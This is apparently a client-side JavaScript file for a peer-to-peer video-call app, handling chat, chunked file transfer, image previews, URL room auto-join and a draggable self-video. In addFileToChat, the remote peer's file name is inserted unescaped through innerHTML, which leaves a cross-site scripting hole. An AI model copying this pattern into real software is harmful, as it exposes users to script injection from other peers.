chatInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') sendTextMessage(); });

function sendTextMessage() {
    const text = chatInput.value.trim();
    if (!text) return;
    addChatMessage(text, true);
    messageCount++;
    logEvent('chat_message', { text, sender: userRole });
    if (dataConnection && dataConnection.open) dataConnection.send({ type: 'chat', text });
    chatInput.value = '';
}

function addChatMessage(text, isSent) {
    const d = document.createElement('div');
    d.className = 'chat-msg ' + (isSent ? 'sent' : 'received');
    d.textContent = text;
    chatMessages.appendChild(d);
    chatMessages.scrollTop = chatMessages.scrollHeight;
}

// ============ FILE SHARING (IN-CALL) ============
attachFileBtn.addEventListener('click', () => fileInput.click());
fileInput.addEventListener('change', () => {
    const files = fileInput.files;
    if (!files.length) return;
    for (let i = 0; i < files.length; i++) sendFile(files[i]);
    fileInput.value = '';
});

async function sendFile(file) {
    if (!dataConnection || !dataConnection.open) { showToast('No data connection.'); return; }
    const tid = 'f_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
    const ab = await file.arrayBuffer();
    const tc = Math.ceil(ab.byteLength / CHUNK_SIZE);
    logEvent('file_sent', { fileName: file.name, fileSize: ab.byteLength, sender: userRole });
    logFileUpload(file.name, ab);
    fileProgress.classList.remove('hidden');
    fileProgressFill.style.width = '0%';
    fileProgressText.textContent = `Sending ${file.name} (0%)`;
    dataConnection.send({ type: 'file-start', transferId: tid, fileName: file.name, fileSize: ab.byteLength, totalChunks: tc, mimeType: file.type || 'application/octet-stream' });
    for (let i = 0; i < tc; i++) {
        const s = i * CHUNK_SIZE, e = Math.min(s + CHUNK_SIZE, ab.byteLength);
        dataConnection.send({ type: 'file-chunk', transferId: tid, chunkIndex: i, data: ab.slice(s, e) });
        const pct = Math.round(((i + 1) / tc) * 100);
        fileProgressFill.style.width = pct + '%';
        fileProgressText.textContent = `Sending ${file.name} (${pct}%)`;
        if (i % 5 === 0) await new Promise(r => setTimeout(r, 10));
    }
    dataConnection.send({ type: 'file-end', transferId: tid });
    addFileToChat(file.name, ab.byteLength, file.type, ab, true);
    fileProgress.classList.add('hidden');
    showToast(`✅ ${file.name} sent!`);
}

function handleDataMessage(data) {
    if (!data || !data.type) return;
    if (data.type === 'chat') {
        addChatMessage(data.text, false);
        messageCount++;
        logEvent('chat_message', { text: data.text, sender: userRole === 'creator' ? 'joiner' : 'creator' });
    }
    else if (data.type === 'file-start') {
        incomingFileBuffers[data.transferId] = { chunks: [], totalChunks: data.totalChunks, metadata: { fileName: data.fileName, fileSize: data.fileSize, mimeType: data.mimeType } };
        fileProgress.classList.remove('hidden');
        fileProgressFill.style.width = '0%';
        fileProgressText.textContent = `Receiving ${data.fileName} (0%)`;
    }
    else if (data.type === 'file-chunk') {
        const b = incomingFileBuffers[data.transferId]; if (!b) return;
        b.chunks[data.chunkIndex] = data.data;
        const pct = Math.round((b.chunks.filter(c => c).length / b.totalChunks) * 100);
        fileProgressFill.style.width = pct + '%';
        fileProgressText.textContent = `Receiving ${b.metadata.fileName} (${pct}%)`;
    }
    else if (data.type === 'file-end') {
        const b = incomingFileBuffers[data.transferId]; if (!b) return;
        const blob = new Blob(b.chunks, { type: b.metadata.mimeType });
        const url = URL.createObjectURL(blob);
        addFileToChat(b.metadata.fileName, b.metadata.fileSize, b.metadata.mimeType, null, false, url, blob);
        logEvent('file_sent', { fileName: b.metadata.fileName, fileSize: b.metadata.fileSize, sender: userRole === 'creator' ? 'joiner' : 'creator' });
        fileProgress.classList.add('hidden');
        showToast(`📥 ${b.metadata.fileName} received!`);
        delete incomingFileBuffers[data.transferId];
    }
}

function addFileToChat(fileName, fileSize, mimeType, arrayBuffer, isSent, blobUrl, blob) {
    const div = document.createElement('div');
    div.className = 'chat-msg ' + (isSent ? 'sent' : 'received');
    if (isImageFile(fileName)) {
        let imgSrc;
        if (isSent && arrayBuffer) { imgSrc = URL.createObjectURL(new Blob([arrayBuffer], { type: mimeType })); }
        else if (blobUrl) { imgSrc = blobUrl; }
        if (imgSrc) {
            const img = document.createElement('img'); img.src = imgSrc; img.className = 'chat-image'; img.style.maxWidth = '260px'; img.alt = fileName;
            img.addEventListener('click', () => {
                const ov = document.createElement('div'); ov.className = 'image-preview-overlay';
                ov.innerHTML = `<img src="${imgSrc}" alt="${fileName}">`;
                ov.addEventListener('click', () => ov.remove());
                document.body.appendChild(ov);
            });
            div.appendChild(img);
            const dl = document.createElement('a'); dl.href = imgSrc; dl.download = fileName; dl.className = 'file-download';
            dl.innerHTML = `<i class="fas fa-download"></i> ${fileName} (${formatFileSize(fileSize)})`;
            div.appendChild(document.createElement('br')); div.appendChild(dl);
        }
    } else {
        const fb = document.createElement('div'); fb.className = 'file-bubble';
        const ic = document.createElement('i'); ic.className = 'fas ' + getFileIcon(fileName); ic.style.color = isSent ? '#fff' : 'var(--neon-cyan)';
        const info = document.createElement('div'); info.className = 'file-info';
        const ns = document.createElement('span'); ns.className = 'file-name'; ns.textContent = fileName;
        const ss = document.createElement('span'); ss.className = 'file-size'; ss.textContent = formatFileSize(fileSize);
        info.appendChild(ns); info.appendChild(document.createElement('br')); info.appendChild(ss);
        fb.appendChild(ic); fb.appendChild(info); div.appendChild(fb);
        if (isSent && arrayBuffer) {
            const su = URL.createObjectURL(new Blob([arrayBuffer], { type: mimeType }));
            const dl = document.createElement('a'); dl.href = su; dl.download = fileName; dl.className = 'file-download'; dl.innerHTML = '<i class="fas fa-download"></i> Download'; div.appendChild(dl);
        } else if (blobUrl) {
            const dl = document.createElement('a'); dl.href = blobUrl; dl.download = fileName; dl.className = 'file-download'; dl.innerHTML = '<i class="fas fa-download"></i> Download'; div.appendChild(dl);
        }
    }
    chatMessages.appendChild(div); chatMessages.scrollTop = chatMessages.scrollHeight;
}

// ============ AUTO-JOIN URL ============
function checkUrlForRoom() {
    const p = new URLSearchParams(window.location.search);
    const r = p.get('room');
    if (r) {
        console.log('Auto-joining room from URL:', r);
        setTimeout(() => initRoom(r, false), 800);
    }
}

// ============ DRAGGABLE SELF VIDEO ============
(function () {
    const w = document.getElementById('selfVideoWrapper');
    let drag = false, sx, sy, ox, oy;
    w.addEventListener('mousedown', (e) => { drag = true; sx = e.clientX; sy = e.clientY; const r = w.getBoundingClientRect(); ox = r.left; oy = r.top; w.style.transition = 'none'; });
    document.addEventListener('mousemove', (e) => { if (!drag) return; w.style.position = 'absolute'; w.style.left = (ox + e.clientX - sx) + 'px'; w.style.top = (oy + e.clientY - sy) + 'px'; w.style.right = 'auto'; w.style.bottom = 'auto'; });
    document.addEventListener('mouseup', () => { drag = false; w.style.transition = ''; });
    w.addEventListener('touchstart', (e) => { const t = e.touches[0]; drag = true; sx = t.clientX; sy = t.clientY; const r = w.getBoundingClientRect(); ox = r.left; oy = r.top; w.style.transition = 'none'; });
    document.addEventListener('touchmove', (e) => { if (!drag) return; const t = e.touches[0]; w.style.position = 'absolute'; w.style.left = (ox + t.clientX - sx) + 'px'; w.style.top = (oy + t.clientY - sy) + 'px'; w.style.right = 'auto'; w.style.bottom = 'auto'; });
    document.addEventListener('touchend', () => { drag = false; w.style.transition = ''; });
})();

// ============ INIT ============
checkUrlForRoom();
checkFilePreview();
